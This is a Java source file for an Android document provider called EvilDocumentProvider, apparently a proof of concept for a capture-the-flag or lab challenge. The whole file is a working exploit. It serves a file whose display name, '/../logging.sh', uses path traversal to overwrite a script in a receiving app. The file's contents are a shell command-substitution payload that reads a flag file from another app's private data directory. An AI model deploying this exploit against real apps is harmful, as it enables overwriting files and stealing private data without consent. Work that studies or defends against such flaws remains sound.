package com.example.ingotlauncher;

import android.content.Context;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.CancellationSignal;
import android.os.ParcelFileDescriptor;
import android.provider.DocumentsContract;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class EvilDocumentProvider extends android.provider.DocumentsProvider {

    private static final String ROOT_DOC_ID = "root";
    private static final String EVIL_DOC_ID = "evilfile";

    @Override
    public boolean onCreate() {
        return true;
    }

    @Override
    public android.database.Cursor queryRoots(String[] projection) {
        MatrixCursor cursor = new MatrixCursor(new String[] {
                DocumentsContract.Root.COLUMN_ROOT_ID,
                DocumentsContract.Root.COLUMN_DOCUMENT_ID,
                DocumentsContract.Root.COLUMN_TITLE,
                DocumentsContract.Root.COLUMN_FLAGS,
                DocumentsContract.Root.COLUMN_MIME_TYPES
        });

        cursor.newRow()
                .add("root", ROOT_DOC_ID)
                .add(DocumentsContract.Root.COLUMN_DOCUMENT_ID, ROOT_DOC_ID)
                .add(DocumentsContract.Root.COLUMN_TITLE, "EvilRoot")
                .add(DocumentsContract.Root.COLUMN_FLAGS,
                        DocumentsContract.Root.FLAG_SUPPORTS_CREATE |
                                DocumentsContract.Root.FLAG_LOCAL_ONLY)
                .add(DocumentsContract.Root.COLUMN_MIME_TYPES, "*/*");

        return cursor;
    }

    @Override
    public android.database.Cursor queryDocument(String documentId, String[] projection)
            throws FileNotFoundException {
        MatrixCursor cursor = new MatrixCursor(new String[] {
                DocumentsContract.Document.COLUMN_DOCUMENT_ID,
                DocumentsContract.Document.COLUMN_DISPLAY_NAME,
                DocumentsContract.Document.COLUMN_SIZE,
                DocumentsContract.Document.COLUMN_MIME_TYPE,
                DocumentsContract.Document.COLUMN_FLAGS
        });

        if (ROOT_DOC_ID.equals(documentId)) {
            cursor.newRow()
                    .add(ROOT_DOC_ID)
                    .add("EvilRoot")
                    .add(0)
                    .add(DocumentsContract.Document.MIME_TYPE_DIR)
                    .add(DocumentsContract.Document.FLAG_DIR_SUPPORTS_CREATE);
        } else if (EVIL_DOC_ID.equals(documentId)) {
            cursor.newRow()
                    .add(EVIL_DOC_ID)
                    .add("/../logging.sh")  // path traversal
                    .add(1234)
                    .add("text/plain")
                    .add(0);
        } else {
            throw new FileNotFoundException("Unknown documentId: " + documentId);
        }

        return cursor;
    }

    @Override
    public android.database.Cursor queryChildDocuments(String parentDocumentId, String[] projection,
                                                       String sortOrder) throws FileNotFoundException {
        if (!ROOT_DOC_ID.equals(parentDocumentId)) {
            throw new FileNotFoundException("Invalid parentDocumentId: " + parentDocumentId);
        }

        MatrixCursor cursor = new MatrixCursor(new String[] {
                DocumentsContract.Document.COLUMN_DOCUMENT_ID,
                DocumentsContract.Document.COLUMN_DISPLAY_NAME,
                DocumentsContract.Document.COLUMN_SIZE,
                DocumentsContract.Document.COLUMN_MIME_TYPE,
                DocumentsContract.Document.COLUMN_FLAGS
        });

        cursor.newRow()
                .add(EVIL_DOC_ID)
                .add("/../logging.sh")
                .add(1234)
                .add("text/plain")
                .add(0);

        return cursor;
    }

    @Override
    public ParcelFileDescriptor openDocument(String documentId, String mode, CancellationSignal signal)
            throws FileNotFoundException {
        File file = new File(getContext().getCacheDir(), "dummy.txt");
        try {
            if (!file.exists()) file.createNewFile();
            try (FileOutputStream out = new FileOutputStream(file)) {
                String payload = "log \"$(cat /data/data/com.innocent/files/flag.txt)\"";
                out.write(payload.getBytes());
            }
        } catch (IOException e) {
            throw new FileNotFoundException("Failed to create dummy file");
        }
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
    }
}
